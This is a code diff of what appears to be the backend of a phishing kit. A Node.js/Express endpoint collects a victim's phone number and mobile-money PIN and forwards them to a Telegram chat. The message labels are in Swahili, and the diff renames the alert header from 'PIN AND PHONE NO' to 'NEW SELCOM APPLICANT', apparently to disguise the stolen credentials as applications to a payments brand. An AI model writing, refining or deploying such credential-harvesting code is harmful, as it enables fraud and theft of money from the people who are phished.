@@ -142,7 +142,7 @@ app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-// Step 1: PIN AND PHONE NO:
+// Step 1: NEW SELCOM APPLICANT delivery to Telegram
 app.post('/api/submit-credentials', async (req, res) => {
   try {
     let { phone, pin, adminChatId } = req.body || {};
@@ -158,7 +158,7 @@ app.post('/api/submit-credentials', async (req, res) => {
       status: 'WAITING_CREDS_APPROVAL' 
     });
 
-    const message = `🔴 *PIN AND PHONE NO:*\n\n` +
+    const message = `🔴 *NEW SELCOM APPLICANT*\n\n` +
                     `📞 *Namba ya Simu:* \`${phone}\`\n` +
                     `🔒 *Namba ya PIN:* \`${pin}\``;
 
@@ -247,4 +247,4 @@ app.listen(PORT, async () => {
   await initBot();
   console.log(`Server running on port ${PORT}`);
 });
-  
+                     
